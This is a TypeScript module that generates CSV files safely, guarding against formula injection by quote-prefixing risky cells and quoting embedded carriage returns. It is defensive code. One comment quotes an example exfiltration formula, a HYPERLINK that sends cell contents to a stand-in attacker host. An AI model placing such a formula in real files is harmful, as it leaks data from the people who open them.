/**
 * Shared, spreadsheet-injection-safe CSV generation.
 *
 * Before this module existed, four separate components each defined their
 * own identical `escapeCSV`/`escape` helper (BulkCaseUpload.tsx,
 * BulkRapidResponseUpload.tsx, ReportGenerationSystem.tsx,
 * RapidResponseCasesPage.tsx) that only escaped commas/quotes/newlines —
 * none of them guarded against CSV/formula injection (OWASP: a cell
 * beginning with `=`, `+`, `-`, `@`, a tab, or a carriage return is
 * interpreted as a formula by Excel/Google Sheets/LibreOffice when the
 * file is opened, e.g. `=HYPERLINK("http://evil.example/steal?d="&A1)`).
 * Since case/judgment titles, summaries, and other free-text fields
 * accepted via the regular submission forms AND the bulk CSV upload
 * ultimately get re-exported to CSV by these same four call sites, an
 * attacker-controlled value could execute as a formula for whoever opens
 * an export in a spreadsheet app.
 *
 * The standard mitigation (used here) is to prefix a value that would
 * otherwise trigger formula interpretation with a single quote. Every
 * major spreadsheet application treats a leading `'` as "read the rest of
 * this cell as literal text" and does not display the quote itself, so
 * this changes nothing about what a legitimate value looks like once
 * opened.
 */

const FORMULA_TRIGGER_CHARS = ['=', '+', '-', '@', '\t', '\r'];

/** Escapes one CSV cell value: neutralizes formula injection, then quotes if it contains a comma/quote/newline. */
export function sanitizeCsvCell(value: unknown): string {
  const str = value == null ? '' : String(value);
  const guarded = FORMULA_TRIGGER_CHARS.some(prefix => str.startsWith(prefix)) ? `'${str}` : str;
  // A bare, unquoted \r (not just \n) must also force quoting: without
  // quotes, a spreadsheet reader can treat an embedded carriage return as
  // a row break, exposing whatever follows it as a new, unguarded cell —
  // e.g. `safe\r=1+1` would otherwise be emitted as-is, letting `=1+1`
  // read as its own formula cell on the "next row" despite this value
  // itself not starting with a formula-trigger character.
  return guarded.includes(',') || guarded.includes('"') || guarded.includes('\n') || guarded.includes('\r')
    ? `"${guarded.replace(/"/g, '""')}"`
    : guarded;
}

/** Joins rows of raw values into a full CSV document (CRLF row separators, per RFC 4180). */
export function toCsv(rows: unknown[][]): string {
  return rows.map(row => row.map(sanitizeCsvCell).join(',')).join('\r\n');
}

/** Triggers a browser download of CSV content, with a UTF-8 BOM so Excel opens non-ASCII text correctly. */
export function downloadCsv(content: string, filename: string): void {
  const blob = new Blob(['﻿' + content], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}
